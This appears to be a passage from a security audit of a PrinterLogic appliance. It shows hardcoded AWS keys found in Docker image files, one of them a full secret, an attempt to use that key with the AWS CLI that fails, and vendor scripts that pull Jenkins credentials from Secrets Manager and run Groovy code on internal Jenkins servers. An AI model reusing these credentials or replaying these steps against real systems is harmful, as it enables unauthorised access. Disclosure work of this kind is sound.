<p>Hardcoded AWS keys in <code>Readme.md</code>, <code>.env</code> and <code>.env.local</code> files:</p>
<pre><code>root@printerlogic:/var/lib/docker/overlay2/b824f2e313d90952d397bc61401bff229c6feea92597b8d37758b959b08d2ffa/merged/var/www/app# less Readme.md

AWS_ACCESS_KEY_ID: AKIAJ5I5ZX5VQ43PMYIQ
AWS_DEFAULT_REGION: us-west-2
AWS_QUEUE_NAMESPACE: 709423830911
AWS_QUEUE_PREFIX: service-pi_
AWS_SECRET_ACCESS_KEY: (secret key is here)
QUEUE_DRIVER: sqs


root@printerlogic:~# docker exec -it f0e85e3f453e bash
root@f0e85e3f453e:/var/www/app#  printenv
AWS_DEFAULT_REGION=us-west-2
AWS_QUEUE_PREFIX=appliance_
AWS_SECRET_ACCESS_KEY=
AWS_DB_BACKUP_BUCKET=appliance-storage-01-us-west-2-dbbackups
AWS_ACCOUNT_ID=
AWS_ACCESS_KEY_ID=
AWS_QUEUE_NAMESPACE=453267620913


root@6eff9ad21815:/var/www/app# cat .env.local
#
# Environment variables expected by config/aws.php and config/queue.php
# Docker will set them at container runtime
#
# AWS variables only apply when QUEUE_CONNECTION=sqs
#AWS_ACCESS_KEY_ID=AKIAIWHNML7OFS67RVKQ
#AWS_SECRET_ACCESS_KEY=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
#AWS_DEFAULT_REGION=us-west-2
#AWS_QUEUE_PREFIX=local_
#AWS_QUEUE_NAMESPACE=453267620913


AWS_ROLE_ARN=arn:aws:iam::${INSTANCE_ACCOUNT_ID:-}:role/engineering/services/pl-migrations-${PRINTERCLOUD_DOMAIN}



root@5513823753ee:/var/www/app# cat .env


#AWS_ACCESS_KEY_ID=AKIAIWHNML7OFS67RVKQ
#AWS_SECRET_ACCESS_KEY=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


cat ./out-images/ca4c2c2f1d1ae20e040f645497fadeb96292efc22af690ae5d6f78629c9d80a5/var/www/app/.env.local
# Docker will set them at container runtime - local environments use database queues, not AWS
#
# AWS_ACCESS_KEY_ID=SECRETS_DO_NOT_BELONG_HERE
# AWS_SECRET_ACCESS_KEY=SECRETS_DO_NOT_BELONG_HERE
AWS_DEFAULT_REGION=us-west-2
AWS_DB_BACKUP_BUCKET=pl-pi-db-backup
# AWS_QUEUE_PREFIX=local_
# AWS_QUEUE_NAMESPACE=453267620913
</code></pre>
<p>Laravel may use these keys to store data.</p>
<p>Content of the <code>filesystems.php</code> configuration file for Laravel:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% cat ./www/app/config-laravel/filesystems.php

        &#39;s3DbBackup&#39; =&gt; [
            &#39;driver&#39; =&gt; &#39;s3&#39;,
            &#39;key&#39;    =&gt; env(&#39;AWS_ACCESS_KEY_ID&#39;),
            &#39;secret&#39; =&gt; env(&#39;AWS_SECRET_ACCESS_KEY&#39;),
            &#39;region&#39; =&gt; env(&#39;AWS_DEFAULT_REGION&#39;, &#39;us-west-2&#39;),
            &#39;bucket&#39; =&gt; env(&#39;AWS_DB_BACKUP_BUCKET&#39;),
        ],
</pre></div>

<p>When testing these keys, luckily they do not work:</p>
<pre><code>kali% aws configure
AWS Access Key ID [None]: AKIAIWHNML7OFS67RVKQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-west-2
Default output format [None]: json
kali% aws s3 ls
An error occurred (InvalidAccessKeyId) when calling the ListBuckets operation: The AWS Access Key Id you provided does not exist in our records.
</code></pre>
<p>When trying to find other credentials, it appears some AWS buckets are defined in shell scripts:</p>
<p>Grepping <code>BUCKET</code> in the Docker instances:</p>
<pre><code>./out-images/10daa560935d018324043b3ae4110cc94d91e24ab756da94634f6106b2f69ec6/var/www/app/.env:AWS_DB_BACKUP_BUCKET=pl-pi-db-backup
./out-images/f9380ebd8863a503cfb6f1864cfd46dc28611d1e35c7569fc26eb07700c41f63/opt/pc-sys/env/base/app.env:AWS_DB_BACKUP_BUCKET="${ENVIRONMENT:-prod}-storage-01-${REGION:-us-west-2}-dbbackups"
./out-images/f9380ebd8863a503cfb6f1864cfd46dc28611d1e35c7569fc26eb07700c41f63/opt/pc-sys/env/overlays/service-stack/app.env:AWS_DB_BACKUP_BUCKET=service-${LOCAL_SERVICE}-${REGION:-us-west-2}-dbbackups
</code></pre>
<p>This list is not exhaustive and it is recommended to review every Docker instance.</p>
<p>From the script <code>get-aws-secret.sh</code>, it appears the solution uses AWS Secret Manager to retrieve username and password of the PrinterLogic Jenkins servers (buildmaster-01.pl-labs.com and buildmaster-02.pl-labs.com):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>root@printerlogic:/var/lib/docker/overlay2/8a3ab41bb86c5ad10915b7a9840fcd4584b7cb2761b653856d81626025dcc1a9/diff/opt/bin# grep get-aws-secret.sh *
aws-mon.sh:  <span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access username<span style="color: #008000; font-weight: bold">)</span>
aws-mon.sh:  <span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access password<span style="color: #008000; font-weight: bold">)</span>
aws-mon.sh:  <span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access credential_id<span style="color: #008000; font-weight: bold">)</span>

root@printerlogic:/var/lib/docker/overlay2/8a3ab41bb86c5ad10915b7a9840fcd4584b7cb2761b653856d81626025dcc1a9/diff/opt/bin# cat get-aws-secret.sh 
<span style="color: #408080; font-style: italic">#!/bin/bash</span>
<span style="color: #19177C">SECRET_ID</span><span style="color: #666666">=</span><span style="color: #19177C">$1</span>
<span style="color: #19177C">SECRET_KEY</span><span style="color: #666666">=</span><span style="color: #19177C">$2</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_ID</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span> ; <span style="color: #008000; font-weight: bold">then</span> 
    <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;You must specify the secret id and key (in that order)&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_KEY</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span> ; <span style="color: #008000; font-weight: bold">then</span> 
    <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;You must specify the secret id and key (in that order)&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">fi</span>

<span style="color: #408080; font-style: italic"># Get the secret</span>
<span style="color: #19177C">SECRET_VALUE</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>aws secretsmanager --output text get-secret-value --secret-id <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_ID</span><span style="color: #BB6688; font-weight: bold">}</span> | awk <span style="color: #BA2121">&#39;{print $4}&#39;</span> | jq -r <span style="color: #BA2121">&quot;.</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_KEY</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #19177C">$?</span> -gt <span style="color: #666666">0</span> <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_VALUE</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span> ; <span style="color: #008000; font-weight: bold">then</span> 
    <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Unable to find a value for id: &#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_ID</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39; and key: &#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_KEY</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39;&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">fi</span>

<span style="color: #408080; font-style: italic"># Release the hounds!</span>
<span style="color: #008000">echo</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">SECRET_VALUE</span><span style="color: #BB6688; font-weight: bold">}</span>
</pre></div>

<p>After analyzing some shell scripts present in Docker instances, the scripts are also used to execute code on remote Jenkins instances:</p>
<p>Managing buildmaster-01.pl-labs.com:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% <span style="color: #008000">pwd</span>
/home/user/printerlogic/updates/out/out-images/4ecc6d1307c1c74ddccbdc983b2fe024742ec0531265255b5730dcb5afc0fa52
kali% less opt/build/bin/lifecycle-hook-watch.sh
<span style="color: #408080; font-style: italic">#!/bin/bash -l</span>
<span style="color: #19177C">JENKINS_URL</span><span style="color: #666666">=</span>buildmaster-01.pl-labs.com

<span style="color: #408080; font-style: italic"># How long to wait for jenkins jobs to complete before forcefully killing the instance</span>
<span style="color: #19177C">WAIT_MINUTES</span><span style="color: #666666">=45</span>

<span style="color: #408080; font-style: italic"># Get Jenkins secret info</span>
<span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access username<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access password<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access credential_id<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>  <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>  <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
        <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Missing one or more of jenkins username/password/credential_id&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">fi</span>

<span style="color: #408080; font-style: italic"># Get a temporary token so we can make a curl requests to jenkins</span>
<span style="color: #19177C">JENKINS_TOKEN</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>curl -u <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> <span style="color: #BA2121">&#39;&#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39;/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,&quot;:&quot;,//crumb)&#39;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #19177C">$?</span> -gt <span style="color: #666666">0</span>  <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>  <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
        <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Unable to retrieve a token from the jenkins master&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">fi</span>
...
<span style="color: #408080; font-style: italic"># Mark this node offline so it won&#39;t take more jobs</span>
<span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Taking node </span><span style="color: #19177C">$INSTANCE_IP</span><span style="color: #BA2121"> offline&quot;</span>
curl -X POST -s -u  <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> -H <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span>/computer/linux-build-<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_IP</span><span style="color: #BB6688; font-weight: bold">}</span>/toggleOffline?offlineMessage<span style="color: #666666">=</span>ScalingDown

<span style="color: #408080; font-style: italic"># Check for jobs running on this node, wait if necessary</span>
<span style="color: #19177C">i</span><span style="color: #666666">=0</span>; <span style="color: #008000; font-weight: bold">until</span> <span style="color: #666666">[</span> <span style="color: #19177C">$i</span> -ge <span style="color: #19177C">$WAIT_MINUTES</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">do</span>
  <span style="color: #19177C">RESP</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>curl -s -u <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> -H <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span>/computer/linux-build-<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_IP</span><span style="color: #BB6688; font-weight: bold">}</span>/loadStatistics/api/json?depth<span style="color: #666666">=2</span><span style="color: #008000; font-weight: bold">)</span>
  <span style="color: #19177C">BUSY_EXECS</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span><span style="color: #008000">echo</span> <span style="color: #19177C">$RESP</span> | jq <span style="color: #BA2121">&#39;.busyExecutors.sec10.latest&#39;</span><span style="color: #008000; font-weight: bold">)</span>
...
 Remove node from Jenkins entirely
curl -X POST -s -u  <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> -H <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span>/computer/linux-build-<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_IP</span><span style="color: #BB6688; font-weight: bold">}</span>/doDelete
</pre></div>

<p>Executing code on buildmaster-01.pl-labs.com:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% less opt/build/bin/register-node.sh
<span style="color: #19177C">JENKINS_URL</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;http://jenkins.pl-labs.com&quot;</span>
<span style="color: #19177C">NODE_IP</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_IP</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>
...
<span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access username<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access password<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>get-aws-secret.sh jenkins_access credential_id<span style="color: #008000; font-weight: bold">)</span>
...
curl -v -u <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> -H <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> -d <span style="color: #BA2121">&#39;script=</span>
<span style="color: #BA2121">import hudson.model.Node.Mode</span>
<span style="color: #BA2121">import hudson.slaves.*</span>
<span style="color: #BA2121">import jenkins.model.Jenkins</span>
<span style="color: #BA2121">import hudson.plugins.sshslaves.SSHLauncher</span>
<span style="color: #BA2121">import hudson.plugins.sshslaves.verifiers.*</span>
<span style="color: #BA2121">SshHostKeyVerificationStrategy hostKeyVerificationStrategy = new NonVerifyingKeyVerificationStrategy()</span>
<span style="color: #BA2121">DumbSlave dumb = new DumbSlave(&quot;&#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">NODE_NAME</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39;&quot;,</span>
<span style="color: #BA2121">&quot;&#39;&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">NODE_DESC</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;&#39;&quot;,</span>
<span style="color: #BA2121">&quot;/home/jenkins&quot;,</span>
<span style="color: #BA2121">&quot;&#39;&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">NODE_EXECUTORS</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;&#39;&quot;,</span>
<span style="color: #BA2121">Mode.EXCLUSIVE,</span>
<span style="color: #BA2121">&quot;&#39;&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">NODE_LABELS</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;&#39;&quot;,</span>
<span style="color: #BA2121">new hudson.plugins.sshslaves.SSHLauncher(&quot;&#39;&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">NODE_HOST</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;&#39;&quot;, 22, &quot;&#39;&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;&#39;&quot;, null, null, &quot;&quot;, &quot;&quot;, 210, 0, 0, hostKeyVerificationStrategy),</span>
<span style="color: #BA2121">RetentionStrategy.INSTANCE)</span>
<span style="color: #BA2121">Jenkins.instance.addNode(dumb)</span>
<span style="color: #BA2121">&#39;</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span>/script
</pre></div>

<p>Some scripts allow monitoring Jenkins, e.g.:</p>
<p>Monitoring a Jenkins server:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>printerlogic:/var/lib/docker/overlay2/8a3ab41bb86c5ad10915b7a9840fcd4584b7cb2761b653856d81626025dcc1a9/diff/opt/bin# vi aws-mon.sh 
 <span style="color: #666666">25</span> <span style="color: #19177C">instanceid</span><span style="color: #666666">=</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_ID</span><span style="color: #BB6688; font-weight: bold">}</span>
 <span style="color: #666666">26</span> <span style="color: #19177C">azone</span><span style="color: #666666">=</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">INSTANCE_AZ</span><span style="color: #BB6688; font-weight: bold">}</span>
 <span style="color: #666666">27</span> <span style="color: #19177C">region</span><span style="color: #666666">=</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">REGION</span><span style="color: #BB6688; font-weight: bold">}</span>
 <span style="color: #666666">28</span> <span style="color: #008000">export</span> <span style="color: #19177C">EC2_REGION</span><span style="color: #666666">=</span><span style="color: #19177C">$region</span>
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">671</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[</span> <span style="color: #19177C">$JENKINS_BUILD_EXECUTORS</span> -eq <span style="color: #666666">1</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">672</span>   <span style="color: #19177C">JENKINS_URL</span><span style="color: #666666">=</span>buildmaster-01.pl-labs.com
<span style="color: #666666">673</span>   <span style="color: #19177C">LOCAL_IP</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>hostname --ip-address<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">674</span> 
<span style="color: #666666">675</span>   <span style="color: #408080; font-style: italic"># Get Jenkins secret info</span>
<span style="color: #666666">676</span>   <span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access username<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">677</span>   <span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access password<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">678</span>   <span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>/var/www/cicd-linux-ops/bin/get-aws-secret.sh jenkins_access credential_id<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">679</span>   <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_CREDENTIAL_ID</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">680</span>     <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Missing one or more of jenkins username/password/credential_id&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #666666">681</span>   <span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #666666">682</span> 
<span style="color: #666666">683</span>   <span style="color: #408080; font-style: italic"># Get a temporary token so we can make a curl call to register this node</span>
<span style="color: #666666">684</span>   <span style="color: #19177C">TOKEN</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>curl -s -u <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> <span style="color: #BA2121">&#39;&#39;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&#39;/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,&quot;:&quot;,//crumb)&#39;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">685</span>   <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #19177C">$?</span> -gt <span style="color: #666666">0</span> <span style="color: #666666">]]</span> <span style="color: #666666">||</span> <span style="color: #666666">[[</span> -z <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
<span style="color: #666666">686</span>     <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Unable to retrieve a token from the jenkins master&quot;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">exit</span> <span style="color: #666666">1</span>
<span style="color: #666666">687</span>   <span style="color: #008000; font-weight: bold">fi</span>
<span style="color: #666666">688</span> 
<span style="color: #666666">689</span>   <span style="color: #408080; font-style: italic"># Gather statistics for this build node</span>
<span style="color: #666666">690</span>   <span style="color: #19177C">RESP</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>curl -s -u <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_USERNAME</span><span style="color: #BB6688; font-weight: bold">}</span>:<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_PASSWORD</span><span style="color: #BB6688; font-weight: bold">}</span> -H <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">TOKEN</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">JENKINS_URL</span><span style="color: #BB6688; font-weight: bold">}</span>/computer/linux-build-<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">LOCAL_IP</span><span style="color: #BB6688; font-weight: bold">}</span>/loadStatistics/api/json?depth<span style="color: #666666">=2</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">691</span>   <span style="color: #19177C">avail_ex</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span><span style="color: #008000">echo</span> <span style="color: #19177C">$RESP</span> | jq <span style="color: #BA2121">&#39;.availableExecutors.sec10.latest&#39;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">692</span>   <span style="color: #19177C">busy_ex</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span><span style="color: #008000">echo</span> <span style="color: #19177C">$RESP</span> | jq <span style="color: #BA2121">&#39;.busyExecutors.sec10.latest&#39;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">693</span>   <span style="color: #19177C">queue_length</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span><span style="color: #008000">echo</span> <span style="color: #19177C">$RESP</span> | jq <span style="color: #BA2121">&#39;.queueLength.sec10.latest&#39;</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #666666">694</span>   <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[</span> <span style="color: #19177C">$VERBOSE</span> -eq <span style="color: #666666">1</span> <span style="color: #666666">]</span>; <span style="color: #008000; font-weight: bold">then</span>
